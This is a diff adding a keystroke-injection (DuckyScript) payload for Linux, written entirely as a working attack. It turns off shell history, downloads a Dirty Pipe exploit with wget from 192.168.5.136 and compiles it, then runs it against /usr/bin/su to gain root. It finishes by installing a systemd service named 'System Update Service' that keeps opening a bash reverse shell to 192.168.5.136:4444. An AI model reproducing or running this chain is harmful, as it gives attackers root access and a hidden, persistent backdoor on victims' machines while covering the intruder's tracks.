@@ -1,0 +1,117 @@
+DELAY 100
+
+REM |=== Open Terminal ===|
+CTRL ALT T
+DELAY 1500
+
+REM |=== Clear history ===|
+STRING unset HISTFILE
+ENTER
+DELAY 300
+
+REM |=== Go to /var/tmp (can execute here) ===|
+STRING cd /var/tmp
+ENTER
+DELAY 300
+
+REM |=== Download the Dirty Pipe exploit from YOUR server ===|
+STRING wget http://192.168.5.136:8080/dirty.c
+ENTER
+DELAY 3000
+
+REM |=== Check if download worked ===|
+STRING ls -la dirty.c
+ENTER
+DELAY 500
+
+REM |=== Compile the exploit ===|
+STRING gcc dirty.c -o dirty
+ENTER
+DELAY 2000
+
+REM |=== Check compilation ===|
+STRING ls -la dirty
+ENTER
+DELAY 500
+
+REM |=== Execute the exploit to get root ===|
+
+STRING ./dirty /usr/bin/su
+ENTER
+DELAY 3000
+
+REM Become root with sudo
+STRING sudo su
+ENTER
+DELAY 1500
+
+REM |=== Create systemd service ===|
+STRING cat > /etc/systemd/system/system-update.service << 'EOF'
+ENTER
+DELAY 200
+
+STRING [Unit]
+ENTER
+DELAY 100
+STRING Description=System Update Service
+ENTER
+DELAY 100
+STRING After=network.target
+ENTER
+DELAY 100
+STRING [Service]
+ENTER
+DELAY 100
+STRING Type=simple
+ENTER
+DELAY 100
+STRING Restart=always
+ENTER
+DELAY 100
+STRING RestartSec=30
+ENTER
+DELAY 100
+STRING User=root
+ENTER
+DELAY 100
+STRING ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/192.168.5.136/4444 0>&1 2>&1; sleep 30; done'
+ENTER
+DELAY 100
+STRING [Install]
+ENTER
+DELAY 100
+STRING WantedBy=multi-user.target
+ENTER
+DELAY 100
+STRING EOF
+ENTER
+DELAY 500
+
+REM |=== Reload systemd ===|
+STRING systemctl daemon-reload
+ENTER
+DELAY 800
+
+REM |=== Enable service ===|
+STRING systemctl enable system-update.service
+ENTER
+DELAY 800
+
+REM |=== Start service ===|
+STRING systemctl start system-update.service
+ENTER
+DELAY 1000
+
+REM |=== BACKDOOR ACTIVE Success message ===|
+STRING echo "BACKDOOR ACTIVE - Check listener on port 4444"
+ENTER
+DELAY 1000
+
+REM |=== Exit ===|
+STRING exit
+ENTER
+DELAY 500
+STRING exit
+ENTER
+STRING exit
+ENTER
